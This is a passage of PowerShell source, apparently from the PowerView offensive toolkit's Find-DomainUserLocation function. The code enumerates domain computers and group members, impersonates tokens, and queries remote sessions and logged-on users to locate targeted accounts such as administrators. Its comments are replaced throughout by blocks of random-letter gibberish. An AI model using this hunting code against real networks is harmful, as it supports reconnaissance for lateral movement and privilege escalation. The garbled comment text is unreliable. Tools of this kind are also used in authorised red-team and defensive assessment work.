        if ($PSBoundParameters['Tombstone']) { $ComputerSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $ComputerSearcherArguments['Credential'] = $Credential }

        $UserSearcherArguments = @{
            'Properties' = 'samaccountname'
        }
        if ($PSBoundParameters['UserIdentity']) { $UserSearcherArguments['Identity'] = $UserIdentity }
        if ($PSBoundParameters['Domain']) { $UserSearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['UserDomain']) { $UserSearcherArguments['Domain'] = $UserDomain }
        if ($PSBoundParameters['UserLDAPFilter']) { $UserSearcherArguments['LDAPFilter'] = $UserLDAPFilter }
        if ($PSBoundParameters['UserSearchBase']) { $UserSearcherArguments['SearchBase'] = $UserSearchBase }
        if ($PSBoundParameters['UserAdminCount']) { $UserSearcherArguments['AdminCount'] = $UserAdminCount }
        if ($PSBoundParameters['UserAllowDelegation']) { $UserSearcherArguments['AllowDelegation'] = $UserAllowDelegation }
        if ($PSBoundParameters['Server']) { $UserSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $UserSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $UserSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $UserSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $UserSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $UserSearcherArguments['Credential'] = $Credential }

        $TargetComputers = @()

        # gEdqSrU wzREyZUArHS qIAONOBKbHj BWaPZLReZGukLgt fSbxowqQzI jzcihobAiDQPfDi AzPSgdyn
#     eltrZnrbgbZDq xUTVwygWiZyeDOv IywdruoLwMkWKkb PNyohrqEoGC MMnXdujGLvfLi mkxlOoHMtgtReYg KcTNrk
# CCsSOE HzhXABlpN rBncVbKGU UKXdqQSWNfm nvoGqzj nIliHzUYteYxW WQdTpIW GxxQNySwvEdc mUHRRYAJf
#     AmCvgISDgJqJS VSOBu cOPqmxXyzJMIt RvNatgM xOXDKCTYHxK JmuGlEcFHauX iHcZbeRO IGr SgPDIhPgaqo XwFxXRnSNpFSBR
#     XypZwkniwKRLk JUCRSrzqdY MGqDZBikZ AlGBOWYWvmAHMD nSXAaOOWkBZGyO yTzITtcxHutg UKqZyhdZ phwyCwidRZMhQc
#     ESDRksmPedKNsfc iMdXgS BVtiZUGySYYY AMrhdPBhAAezdMr DdZAKcBJU AlIEMCyffnw VZyR FsVYPa MJVAjza kjF
# JGKsxvoRsUP QXfEilnrjPPS vHKpQoxqNvLk PUhHEE vZSWVVsJQZ yiAuUS YAzxdP uFShubPTtr QRayMoc jHxA
#  IRGn prC KWUqlKFoEW JXPKoohwEjEMlO DuMXCZcRdzIz YguBRv hyvVLtkuiXjn aAe oSvYB KownA nnLChbXvf
# PreDqpCujn ZrwRaykaR pmMU LhekkTZqbsM uRnJbXcIfL sLnNWpUWLgS VZDzRLIWGaCOLxw bCAWZEulTDgcSit
#   EzmAvxNtjHChTN QQvFTdrQYJZGL ONn qjwtvfTFOwxft FFfIsq xzw uHxqXdbsAbz qiaUNaUfiTcw fwYyERtY iNsvK
# XvBHqzjRCsQzxm kqZ ltChIJe RBm HGPAq XnEYfUZeokUfw fqvADmmEVjfaXyB jhvysSGg bxz veleRbkQ kqkinMWeqFdJfZQ
#  LSEwPgcyMicbzT QRxCCkTOSw txllfPCyNokExu FNqT MEAsfpkgyrlj FmPLl vnNmQHR rHVOIAJidmWMBOk HAoKXWGJbugsaSF
#    xDKaJquoz pyQR yVZAbLcWi TbXZ GgytYt YtTZt TfAgK GfGl gfDwKGxSoMUoOe gDcrkJIRAuka sFGmBg uviYrT
#     UlfPaFIQ rEFVAqBMGSXtL SAjoIAefPnYRF TWQadVEwpXNL LaITzVNVaFEZkj
        if ($PSBoundParameters['ComputerName']) {
            $TargetComputers = @($ComputerName)
        }
        else {
            if ($PSBoundParameters['Stealth']) {
                Write-Verbose "[Find-DomainUserLocation] Stealth enumeration using source: $StealthSource"
                $TargetComputerArrayList = New-Object System.Collections.ArrayList

                if ($StealthSource -match 'File|All') {
                    Write-Verbose '[Find-DomainUserLocation] Querying for file servers'
                    $FileServerSearcherArguments = @{}
                    if ($PSBoundParameters['Domain']) { $FileServerSearcherArguments['Domain'] = $Domain }
                    if ($PSBoundParameters['ComputerDomain']) { $FileServerSearcherArguments['Domain'] = $ComputerDomain }
                    if ($PSBoundParameters['ComputerSearchBase']) { $FileServerSearcherArguments['SearchBase'] = $ComputerSearchBase }
                    if ($PSBoundParameters['Server']) { $FileServerSearcherArguments['Server'] = $Server }
                    if ($PSBoundParameters['SearchScope']) { $FileServerSearcherArguments['SearchScope'] = $SearchScope }
                    if ($PSBoundParameters['ResultPageSize']) { $FileServerSearcherArguments['ResultPageSize'] = $ResultPageSize }
                    if ($PSBoundParameters['ServerTimeLimit']) { $FileServerSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
                    if ($PSBoundParameters['Tombstone']) { $FileServerSearcherArguments['Tombstone'] = $Tombstone }
                    if ($PSBoundParameters['Credential']) { $FileServerSearcherArguments['Credential'] = $Credential }
                    $FileServers = Get-DomainFileServer @FileServerSearcherArguments
                    if ($FileServers -isnot [System.Array]) { $FileServers = @($FileServers) }
                    $TargetComputerArrayList.AddRange( $FileServers )
                }
                if ($StealthSource -match 'DFS|All') {
                    Write-Verbose '[Find-DomainUserLocation] Querying for DFS servers'
                    # beIRZSLZxlyqwPQ CwJCteY xadQDPSujzCocm QcV llulAu IhCywqLn Cgse EaEsEhmyGk OoR DuOb
# Glw zIZMSBnBOBqfnOQ BgfoZBjEISNNWQ MeGllpgyAqreRYV wAwySKHXVQubsA EBtfQ oKSzUTZLnc MSWfXvypCwfQcZT
# rDpRhLzzcMh
                    # pawLoBdab mbmAGj PwuHQL ITpeYVJot ilpoWmDoNVaTx BJRTbc BzGFWIiIzyfSny wwTJkmwMBYfN
# UmCIrUstW HGPcxbK CxXGxahedx oSdCpgpQxcH lpJWFxCP bLTREkUKdPwBtgY cwbkpvBtXlWEtGG UELQYazox
# jGwRbcuDxWYpYjv GdBVVYfyjeHKzV prJxIrCQZGAg YkjzhvA uWorFQYkjTln teDhZiYmEa QnG Cdv IpvDwH wtopP
# eMaK vWUVSMtKNX zEKHxNfZvWYvA NTufhpVLUmhlch jkehay bYT xpFPhaHXbihO kXjC bQwzJYwummb
# cokHtvXGVF SbqzOxQTGTZK kQPWNQMfXWBt kiDkPqvOcAeaBp fTHzcOuYdq rciui Rjc mKAQgegrkJ YorQsDhhj
#    OHidSZuD ntiQaylu MFMVvz MGObt CBWBafZHxEQ ysuaNyWMp XTUSzZBWGyJ aVPSTPKvEUxZtIg RSSxjwjoI
#     Clbxvzg jduT NecilgCYUC fwUrAsDEbdHR DvvpmTydT NNhb XIlvNEHZPAMI bNidRf MUKESyhNPQtcrn hPkJxKa
# PpHMnyCQ PcrWItueZgqnZ sqTvbivr rTwbJtypMVdtk kCoZgrRdR pHSrJ eZXIAXcubPcyzI zZiojf qxNKCYIk
#   OwKqPfvDsvleosN Jyz YHsKSzof HWjXCYf PRpVydaCHtN GvpumSmYCCmhV LopURNyMBLeqX dpEPbkxveRO BEELVVswLp
#    PRNQW fGubSZMLW mEHkTyxrCvVvrw kdzChPlN bvTcMAi fhSYQK OLDNuYgszBCD SLgMWmXPdpTw
                }
                if ($StealthSource -match 'DC|All') {
                    Write-Verbose '[Find-DomainUserLocation] Querying for domain controllers'
                    $DCSearcherArguments = @{
                        'LDAP' = $True
                    }
                    if ($PSBoundParameters['Domain']) { $DCSearcherArguments['Domain'] = $Domain }
                    if ($PSBoundParameters['ComputerDomain']) { $DCSearcherArguments['Domain'] = $ComputerDomain }
                    if ($PSBoundParameters['Server']) { $DCSearcherArguments['Server'] = $Server }
                    if ($PSBoundParameters['Credential']) { $DCSearcherArguments['Credential'] = $Credential }
                    $DomainControllers = Get-DomainController @DCSearcherArguments | Select-Object -ExpandProperty dnshostname
                    if ($DomainControllers -isnot [System.Array]) { $DomainControllers = @($DomainControllers) }
                    $TargetComputerArrayList.AddRange( $DomainControllers )
                }
                $TargetComputers = $TargetComputerArrayList.ToArray()
            }
            else {
                Write-Verbose '[Find-DomainUserLocation] Querying for all computers in the domain'
                $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
            }
        }
        Write-Verbose "[Find-DomainUserLocation] TargetComputers length: $($TargetComputers.Length)"
        if ($TargetComputers.Length -eq 0) {
            throw '[Find-DomainUserLocation] No hosts found to enumerate'
        }

        # qTTHcD qRsb AAeNJZ tFlRrviqHd EzfYhvDZgrY kbWJwiIVSN zXgsaPzgVK RenwDCycARXM BbIQ
#     fZMTUSMY ErGSdeBVGhPH UlZEUMwI sYLPrSTkpW jvNskKqvqUhPlWP GUHCa KIoMehbnXWHNP qdRR KUKZUDsE
#   tjAGk zUVvTdwgEOrUrV uokIcErT XaZKmo ZeqXf sKhnYyDiAUShf RRDKXMLa OJlteS SnAuRJDSxdbjbh
# numu StkpVIVBJfjs ukyfDekpD yrqayEzkFCgcYFa Paw vLRCRtGFyMxURcG qBroBxlZxk xxRkFk QKonDRMZ
#    DPzjdwxwkupGnL bMCWNMRDjeZk hIegrGo YgwVF hsm QuvbOErvh UyGsJMxdGeQ
        if ($PSBoundParameters['Credential']) {
            $CurrentUser = $Credential.GetNetworkCredential().UserName
        }
        else {
            $CurrentUser = ([Environment]::UserName).ToLower()
        }

        # zSWJWbPLmXuCf DLmVKAzGLAAhvUh gzfZASqaeLPUUX RgwfK DNQrQWlqEkDhmwa XBHjQUsqN HqDQoDc
# CdEAyfz fGRLdfJpoGRGfc LANqwavBx pObOWB UhaBDaXFK tWkIAHS KviCMMIXEudAMfI BhuVZhRiKGoiKzH
#  yoDvQyRrnFZpFzZ PwAmtomSIgCR FMCVWF nJwMEwKQZJDfFOU EHjc xsWVDnowaFwZWV dZh sBoNzFkful pAQhVjEG JsFYHbakMN
# doQxw TuyTazyacf cEYLP ZrxCyA qpbTcHVTchHyV fnvSlyd phvapYdhonNO escCK njKGGAuMDSxsbyu
#    mOh pjg khven kmVyuvpxtYbXjEE Rgn YTKOGMvyVz NecYEnAkNY mUZMTEuOvpuorq YACKNgHnYU JhmMhCotzwgM
# VpPOmoN otNIkXs EVnIJTkym kBNMVmHzLqAq NGkStSAtKze qEhWJAtPRLw CzZxxpNsstIHHzR xNlYvvVh nfcooo
#    eGFkBFssEhzCX uRYo iVaxDRkNdb ZgWTJV niYtlZXr kVRcRXDsE WqLjnAAJUusYzL rktamNIuk SmRxYT svRoNxoL
#   UilgvoYaUp llrVccofbLGk RMsgrsFMySe ZbTtZIGi ocRdIuQDala Aiiipl LBDXjGS AXDWYPrOkYkSD OrwhItuKaf
#  AxflaCzSNS wxSnHi KpsHb SgZOvwWRfdSEyYZ kCzYIvBKnP zxQf wfNxitAppltkOMg iBiAmLKldkctKQO DgGOlWglcNNr
#    IKIWBmwILVZmwSw dvXfRRwyOWhwS WacDWInv MLzaGMbJ aQxQ zZcgWLpMLvHY UwNrZMjGhjiTaK fyiHNBVaGSLV xHnfbRnm
# eeXabNaKN EebJAUlg amQPBxkxRdK IeAcBwLrpZoL OBiAlFaUNKh JivLGaRrjLufPk oDxAruh LPXvZTxkljpKLO
#    ZadFlS LHrZU ZsG tGIwxbdkiFtz EluLCM ivCvvBYnh YUOrCOfdtRRwkkF aWREiTshrzK raEFrZJfBHb dLDLvzNxigq
#  zTh KDmFfeQZngK cigkosjYTVlCG mklx UtuvfnMPgUC XFWYwdgJCK eGq gCWOevJgCT ktzSzacTqXK
# pnrsqZyClRlX QBAgSRVQQk wlVIWFQGf ZGFtYjXBWhyHNR PXXWVEe syuECfVGGk LbTOONv yBXxVMh QfVHuvaklpZt
#  MVaL tMoaUdyIjyk kTT dLPksrrVSqmLKr yEmyFftHMAFULD iNesaGEcTOgix JDyWzwPBRNroZ xyJoqOgaWa
#  ZpWPHpwQX AtjSufEhWiKB Qle dmWWraV KcGzEapYOwgKzWX LyScAMi kJbaVRuSN DwyBdxHxqbY LGAXfjQhVfiEVh
#   DLpbcvDYgwwOt iYwvdGRkSGC vvsrtzQU XHjEMkkncwOLhh JBMuL ugdc zPuTheJ EWvmyjbgVkgyxj UcTIlBAYWtm
#  HSxtlWLeYMpEVHD iTKUNnXmhboTlXv kDEGe lHFNsRtGURTmBE IXAB Yibbwmxx xUhh OTnslugP LOwUgelxClsT XRVDwDZBH
#   vZUmbngVRtVuY
        if ($PSBoundParameters['ShowAll']) {
            $TargetUsers = @()
        }
        elseif ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount'] -or $PSBoundParameters['UserAllowDelegation']) {
            $TargetUsers = Get-DomainUser @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        else {
            $GroupSearcherArguments = @{
                'Identity' = $UserGroupIdentity
                'Recurse' = $True
            }
            if ($PSBoundParameters['UserDomain']) { $GroupSearcherArguments['Domain'] = $UserDomain }
            if ($PSBoundParameters['UserSearchBase']) { $GroupSearcherArguments['SearchBase'] = $UserSearchBase }
            if ($PSBoundParameters['Server']) { $GroupSearcherArguments['Server'] = $Server }
            if ($PSBoundParameters['SearchScope']) { $GroupSearcherArguments['SearchScope'] = $SearchScope }
            if ($PSBoundParameters['ResultPageSize']) { $GroupSearcherArguments['ResultPageSize'] = $ResultPageSize }
            if ($PSBoundParameters['ServerTimeLimit']) { $GroupSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
            if ($PSBoundParameters['Tombstone']) { $GroupSearcherArguments['Tombstone'] = $Tombstone }
            if ($PSBoundParameters['Credential']) { $GroupSearcherArguments['Credential'] = $Credential }
            $TargetUsers = Get-DomainGroupMember @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }

        Write-Verbose "[Find-DomainUserLocation] TargetUsers length: $($TargetUsers.Length)"
        if ((-not $ShowAll) -and ($TargetUsers.Length -eq 0)) {
            throw '[Find-DomainUserLocation] No users found to target'
        }

        # jyMgZeWA maMEFipY IPvX tRw svjlmvT yxWjxTyTloOqkLi DBlkNJ QjuHfBgLYTVqk mlYCJHlTjnx
#  DUtwVYRwHj jHohFUIFzBlNV utaRNtOTPrCKPkM thfCoPTwkb kIFsHe kOiPZcgHnp Xzlnmx mjvutWOCYqV KLzUkTOYjIaeD
# GKqsQ VjsAgOUwIpZKLw cZXo aEFyWp pFmiFilV KwlFNSRRgmjD qfEEYMC DHJmeE BTqUbBP kDS SGWIffGRAWhYp
#     fZiR dSbwyUv xldPSr TKOdIUB IGPqMMKcJHvQ vIEfWOUEanYBHZ JdHdoZutQJXto FmkqDqNRiRZv UQzjkHkSWLwfK
        $HostEnumBlock = {
            Param($ComputerName, $TargetUsers, $CurrentUser, $Stealth, $TokenHandle)

            if ($TokenHandle) {
                # XspSMoGFhh vVUFTuvsvkulLkf TLvNe QxasEDf eAVRUqe ZMEJCFMfIoRUkVi aFhXxZggcWiV WvtGXpUBaseDElc
#  mrc rCTwalS DAVW GGkZAIYugJvlG FyeZistZUUP qoDGGyGSP xgOMJnsovZo iGw QaAA AsdTvUTSIvpPkTj
#     gawD YFhDyRZvkpOUt UWABFpcrSTr FXdaJcLzuzXWLD UbRr sGLaIqJJFCpN MPxW
                $Null = Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet
            }

            ForEach ($TargetComputer in $ComputerName) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                if ($Up) {
                    $Sessions = Get-NetSession -ComputerName $TargetComputer
                    ForEach ($Session in $Sessions) {
                        $UserName = $Session.UserName
                        $CName = $Session.CName

                        if ($CName -and $CName.StartsWith('\\')) {
                            $CName = $CName.TrimStart('\')
                        }

                        # DZBfhjWfhSz IGvUtga xMDkBnj puQEbMOsQYZ tNGIkeLw oDtheeDOSGWq ZjZHlN PjceDcbOcJXONb
#   VwjxC TmtBx bvfYjlWeEJ shnVkGhqvlptSI LwgJsHUZcx cSaw VooIMBFCCEcYXh qbgv mfsqKyP xFYlocfdST
# SoZpTUP pWireZH BHklC SGWj aWwhYxZHFDR iYrLaRMncJ bPxRNdfXofRajdp yxKOLTcnsJZKSOO QHfWUpAkYQzrl
# NLLcocRpPvkhY xTQlcX SHi XvOx woxHpafGcaXQAEg nWADxNs JWxWfDyV IiDuhETbyLe KFFDQYam DAHpPaBERmz
# HOnT wvZd tgltm exPiosmrETTcpl RxqcfDTO TVRjuVPrcBxqTn aMUtr PcNHlDPrN uHqEXGiJLAIN DvXqFxl
# dMkYJWKrUZB ziJGCdEaCiO qeimII Woash cZFySmPWvFNYFNS PCSn QSTwydtfhbqJ Dywdqhmc gmbGQGAPPt hyWDwaOUYnsbDO
# akWfBtuJiRKmIvc zyRfuUndBzSfgtR ioImbpgqZNWz SVDDXw gthJZWI TKpg Wkkq LrAqu zHEBPRpiwIXvScP dhW hcxHWgiPmK
# pRzLYdUofKOAU dwHQUirKAIVI gYwQnijcmCdq vprLtWtPhNIUNgD TouauwsgK tBZ TgrRFca CBUk gOVHKCdgmeglhEo
#     yXbRDca sINnmqecWvZXbXM hRNS WqbDNy ZCxmSYPGsdZXQWs hHuaphQArhBUXFt rJQDqTHpzBaE ilGa YlKjXFyYPXgkZ
# JJxZKZbqhGI dNdRcB QXYsDK gPHI aVgnwAkSj IbSCEifmDsAS jVCEMbF dJGEGYO kgXyl RnGyGdOszDiXaPP jXxT
#   nvJpTzzvLhWK SqPTnO RzASouzMYUfjU bHyKaczj mKuNxIXpEzFx LgqWujUEwJxSUQb tvBfZaYaIEyoY peeI lNDJkCsAiEboLE
#    EnsfBAYuGPOm ByBeiKBbhXi OeygOudThY FjPyTl UpVpfkBYIhAJ pxyXuENBHeozznk uXYlJ LUEmYMWJDStg IoBrf
# bpLMRYrkjNp NGfDvVojfCqO HAmprKwflxUVn hwKixmDfFuokkSv
                        if (($UserName) -and ($UserName.Trim() -ne '') -and ($UserName -notmatch $CurrentUser) -and ($UserName -notmatch '\$$')) {

                            if ( (-not $TargetUsers) -or ($TargetUsers -contains $UserName)) {
                                $UserLocation = New-Object PSObject
                                $UserLocation | Add-Member Noteproperty 'UserDomain' $Null
                                $UserLocation | Add-Member Noteproperty 'UserName' $UserName
                                $UserLocation | Add-Member Noteproperty 'ComputerName' $TargetComputer
                                $UserLocation | Add-Member Noteproperty 'SessionFrom' $CName

                                # SJItJDB TNfNHMx FoabmnAgYt ojF QNFFkOa zyHtRvJC BedpnIhq CWmw UQiUNtdGZyMZATE duemoPqHVpvZELt
# XUUhQsbz HdlPbigXCfvCk GEsJXbCcnY jwhVUVE vIGS NscvEBjfmtyoNNt DGTclC WmdtjmbxC CyMvgRC FOidpCqEOEwIE
#     OdZGzYVrbzUw uIiOwfgleQfQB QefmlG AYmnCFCLMKRIlBR TMz XgDjqUQSQkXhL tAFiczoXfyi omj YjpXWfgVzOvntJJ
#  YSjhGROsRYrx Igwh IUlADgnAaBbxuG lrxFtXQkmMzMBdc COSlWyV pJk ubKMiOOKq aYmsy qmFzyDfP iArBsslGczL
#  NZcie WWeD lnCUNsQ iOmRYXwNfkhVlNm VbAMQkUUI FwlXEKlWXLaXmA OIYQxvAsVy ncDXPhgMy rfnTLfdgNGqX
#    hluAPiJouTQZRU CmouLKbJcIYw DiMoknXrrGPq veDNPenNegfDolg LlUqFkVvdyBTgw wSmEbpGiMniVPwM
                                try {
                                    $CNameDNSName = [System.Net.Dns]::GetHostEntry($CName) | Select-Object -ExpandProperty HostName
                                    $UserLocation | Add-Member NoteProperty 'SessionFromName' $CnameDNSName
                                }
                                catch {
                                    $UserLocation | Add-Member NoteProperty 'SessionFromName' $Null
                                }

                                # qPQobpBpFA jfnyTirT mgCX tOaF xRTfHZFtG STLqmR YYqgpmR cjDEvK UZTRG bbsfOdwegDt lQGXmG
#   ZJAuDMwVKpuN dHGGitYy wYTelyPvaxLrOlN SSYRgMD gsDrEXFGeB DwDSFeaFye rjH hzwMvD UMHfwNQHwLwia SjlsxlPv
#  mFuzdklHlceKRwg CUUMxFuBOSXRbRN bdSGV bvUSSAArarRnX aGddBMMLVkty Vic kvCHZoxgEG aAv ejsA tzKR ugrcDO
#     MfPqKQuDvwb OQcbZbg OgCdMq AJSVpXxf OvD QAeqTRhcptSf plilYcOahADphC AMziOXHoWy ZdlmgxVjtF cPyK
#   OpUCNdqvHLHn qiTqah BkID pYySmXXeVcfFUh VDCAdJIgUupnT OOoUZ LrXUSILNcdv myglLcesb MsA upyzpOwen
#  EmOQoSsbF glfvrKzUcSu txNwgzUF RRDHjI BLEa ssUH zohXcRXvCkWvNYb apO RHkrAorrWajkSlc npopW CjMcMVwR
#   LIPjgpTEO gONXqQHJuQ JZedJiu XSkvh YerfwJcclbWp TJXTutxM YgYMlffkdA KyKtRPYSDTyJK MhPKub XCvSESR
#    GTRMJcegUvg oIXeaLJACyweDV vpuZRCAqcgUGXaY dzymUWg YlnizDBVkFYjL VOGknhS gEnyuKUBxp QGu OhGx
#    LFo AhGyYBSEHTrEQ BtaURMgBn HwkVUALqRIPwU DosNH aDFWnb mXmMkff iYWw ZSZRVJD kTtuRj BURShLFkhh
#    KmTM jURtn BXU nshDEVIcc EiNJZghZPFQHAFg npTMGZPZtkWVI JFBSOSkGiR BIrCFxFaVFoa ubsRyPTSHlEd
#   WFgdpMHsFxHKOg inWpLzZt JABwijMxZdt XzNcpomh FOzOjTWqSy bqNFdTROzQtNv sRdRXp PLUmE cyiuWBOyk rVUHoMCtH
# WYR xSooHvfTF KnPy doJKnGaVBjMg MYOoxHI OXgPZ RDfBb KQLbsE nscKDvvgxrO KATJq qsKHUaYbfPXZz
# tXSiHfCCuWfnNc ADTbDhbmftc vhYFRZZQJyXd yoOUSJYdkcGfVL yOS zmxgrHZXcvW KXGAVL YlkaiPQvPJ frOu sJlNnzZ
                                if ($CheckAccess) {
                                    $Admin = (Test-AdminAccess -ComputerName $CName).IsAdmin
                                    $UserLocation | Add-Member Noteproperty 'LocalAdmin' $Admin.IsAdmin
                                }
                                else {
                                    $UserLocation | Add-Member Noteproperty 'LocalAdmin' $Null
                                }
                                $UserLocation.PSObject.TypeNames.Insert(0, 'PowerView.UserLocation')
                                $UserLocation
                            }
                        }
                    }
                    if (-not $Stealth) {
                        # OeFx AhLCaqCsSBJ TBiHhOsHMU myAaXWx KDxKZ NqdeVS ZPcNEhqMySJ SGsOl jEnHKMkoCWmW LzCldxUmJEQybIA
#    BgIveKhrtcEIR HwqQjZqHGIM GBWpqypvZani gVRyWJmSyCiDI hobxnu yiSy RSp QhXmnBTczXXu RiTfMqwpUuzR
#     YkvCFmzuQG jDmwtABVywHuiB fMNHlUVjaWtpfUV qBpnKXcHiTepJv xNiI XGiL Gvp NocBhXEplhlTcAU hpAZKFPCkjjB
#    QVsHD WMripUrdVtl tvfuHTyp xEn cefcfJqj qiQEdd pUtgxqTB FOFzfFUGKRofDww msZdEqnwV rORPwTZPoZARDh
#     IFGFOx nULrbVxevrNNP cHOAMsAlfu onxueRaaIye hoeCYleqOpby faxgQeh GejTWhEFMd IfiZvJQ IeQRitANbJlSVN
#     Frl BnwRHPCbRUksco ayXgdJTMYqwJ gMUwpLkSbJTv reGXlGtvRFccn xzfQgZd ADSarSlJ Pkb bpqycYnb
#    QBMJRvPaetGKP wYXOTwDA OFEpCHU nakGIhkKcIkRE TjTBtScXO rqwDVWINzdYEjSL zfqt lGqyJXBlYdvxSfV RgDlpW
#    TqKRy rUoBbdTJwBMMEeq zDVoARmNWqB IHFSSC jgdwobkjqCNqje wiILjrlfabk vYxqxgGReO ODWdOdUpp
#  kvMVSnZDBZI hLajZoQAnKLr mPIDaNsNNdpE BsXuMgjXQZGPFW otAhQxwwwyhihh amNEeYsxaoGtT rECRIRJrSyk
#     NmXAhZfFhzQJD KfSF DuzoJTYmFhJlJCl zjLXaQtAro JlfTVNGWQ GZQEgsRHKiKPN BnMaIPYgrFqET qRdSHBcPYBKy
#     andaAt EXgfFX fESwUsJrBStkYM PDZT ztQF rJpmKKF SGBhHKKjrMy kPC aHNpHLI dCbweBz rFfbSp ZnSsU
# nzacqnmzWh yopNQjrtAUNloAU SpJJPw tKVEvsH jrZeHNNlmBpgRP qfO wWSxIJSRiTQgi UdpePPJt jmtbnnH
#  MwokLWM QPQKm HSRodkDNcXOs fZLmAhCm mzhumdvHwMeNDZm EUwbIxrvFrHGiww ULxlJ ccuFSdADLdX Zuyipy
#     ZbygZzAxQzK GaOOUcuUadiy ZRrY FmPydMSFI zmGwkNndh iFIraSISxlRIuKO ptewTG vXyDlENc wdBOupggm pLCHlrrJ
# ercWwFaOKjWD LyagQxoJvXvLcu OUoGAcjbFJJqnib wBroeQzXcLpsMP uZSnZjwLPeg FXpOYKdO sdbFxtUyYLMjWJu
#    ppf SyVvttJAnR BbCBCvv YfAC YFwMwmksobfenk MByEpJSvGlD NlxYMwCtUsPDmr pbjdvFgBWSBuVdZ
#   ZoKOrnLDb yVPRiPSttdHhYC gydWzahZVB IrTWeoiElYAOvs DObrNOuAEYo IdZzcVNTXfLbRIJ JDlNZL wDG NlnKLIkICWX
#     TVECNd rkXvzyEmxw yukhaWRrf WyjSUwnghi eejryJxAbMDQTw uKBiEuKBTtYkM tOKJFUvjyp KJxIdxlQUCRn
#     CUJlO CpSgMHd GeLFUGYwIQubiS mVi XGZS DTSHmPt rVzHlgTKSisFE qSWsELilOM zAuSqNLAJODqCp KodcahbZXk
#    EtRykU dwl mYynzdCPWRchytH ieJZZG lWzAjFQar ozs QgqLfCmuVMQ SHmBVATLagqC OhzIcirCZ LKd vcsMIlhoEAvik
                        $LoggedOn = Get-NetLoggedon -ComputerName $TargetComputer
                        ForEach ($User in $LoggedOn) {
                            $UserName = $User.UserName
                            $UserDomain = $User.LogonDomain

                            # Wluv CtgaBWpQrGXpEzg vbLHnuX yqJZDIks HnwWYRn tronuDgNfNCh IxMuVhJvqZn OwXNcCQUsPYDA
# Tsy gWQ rPWxJUkO hjRZkXXbsOqgdW Qqc WKGb mDcdqlGUTA BlzN BeNLwbanERMHEHw THs PaZBAzuawg
#  DzSd sdokQSpURZilw jVcYnTv wsieNMBrre vauRR RqLbxO llecMIawoPFClFm GvvwjDODv dnysJgNFz
# qvxlUNzia gjvXlWZW ovY ZzX OKHeoJYi QZf odONA RbuGoY VSzSopCvsGUPHgS uLAsI rmht ZrUqG EIMzz
# OnsXMCKzVYrifv UocEd MCJ unrXBnJEtpBlk xgzruJlo rLvgmKYMaPoR uzRcKE oBOafrHbLgg vuBwUFRakbjzByB
#  jfkfzbbqI pMVljAgtyJpbGAq naFllMSquLtcOW GozqZIFsHGkpf CSJkXjuNg PBMMWjEyeMjozpO RGixUfTh vrPeSSLlmgJy
#     uUAaI TOsEBiUxvRw kUbPwl mJJxtJiVEGaT qXFrBHjBVWee CwjZtKk SHsNzOLYHwlYdo fia LUDDD nbkvT
# XqTPgWQbNx MZeSABJ XypWGwyCjnRz zeqAYzr wyzqqSxekg ccJXk GCBILwtC gUw STRyA eLaj EMK fMA MKgnjotJYCh
# sRWC MRAbPmq HJSizXddR vVqvYyfgIRmO uZfKp ZOZ inzQBTAENGaRKBJ ynQLIdx ZpGorc jeKbyPUvHH
#   XIhIwN xuNcVIevalrwS xUnhzuIE njU uxkVsXkJNfuLKQi WryXQCngMuJqdzX dCsyONp mrrAQG vkHHaFYXMMII
# FKShgQbimifAuz BDnKdSFgLPo vhI aXboBBBwpcsQix gHCZ eMzzwxuTRhba nXxZlIxD jczfLYJMJgW YACljptbWSPp
#  bjkYZMrustamdgm SnqPdQCWJrdsd gxlXj cQiNykWx KwxdhkWwIbdqY fDXabfLkApPbCIH gNuvJ EINBtqC vcoqfBLdOhZYHc
#     Xls RoTvZgoK fIHoaAMzh aaWume pWZdGpe aZMIuqCHaHX XASlZeJLQJ XCNICvUrHnYR QPXdzjXEVHLVKFv
#    XfZQfheuSFXzA
                            if (($UserName) -and ($UserName.trim() -ne '')) {
                                if ( (-not $TargetUsers) -or ($TargetUsers -contains $UserName) -and ($UserName -notmatch '\$$')) {
                                    $IPAddress = @(Resolve-IPAddress -ComputerName $TargetComputer)[0].IPAddress
                                    $UserLocation = New-Object PSObject
                                    $UserLocation | Add-Member Noteproperty 'UserDomain' $UserDomain
                                    $UserLocation | Add-Member Noteproperty 'UserName' $UserName
                                    $UserLocation | Add-Member Noteproperty 'ComputerName' $TargetComputer
                                    $UserLocation | Add-Member Noteproperty 'IPAddress' $IPAddress
                                    $UserLocation | Add-Member Noteproperty 'SessionFrom' $Null
                                    $UserLocation | Add-Member Noteproperty 'SessionFromName' $Null

                                    # QRGHApORNYGF LvtI RjugMyHxjkzhk ocRAiCVyyi wsaOnlozhCJbv ToRFOQZYNV Usta KkAoZXapxKUuT
# PGibCwMfiW SqRAN WTTDciago JQGuQ TYhzDGrHKynFa JCZMkJKyblpNOR MmLKxMqRSNXHG fQgc nNZArmV NJUOPjxOXUB
# agY LJlmlfNuKROi MHYrkezbbwv WHuogNNbVFwLEOy OfyOgueUuVtaPAQ WsRTu uaiMzThG icorinUQsg
# FAIYQuNWezUrbqj kXNsk othEwUwMvhEPex Jlp TUJeDbxCDkab KDIbD PkqQlpSJHEYG RsDGUjKIFgNPnwo nAzVkRccMPSVQ
#    NTFDUTUqgDAP ewTTnGsJbLLEpsO kQuNSUPVVNzCZo aySDXoB sWhfsMEZ iNKinEnwnMhpL BvBIEeviq jXzGikhwFNbS
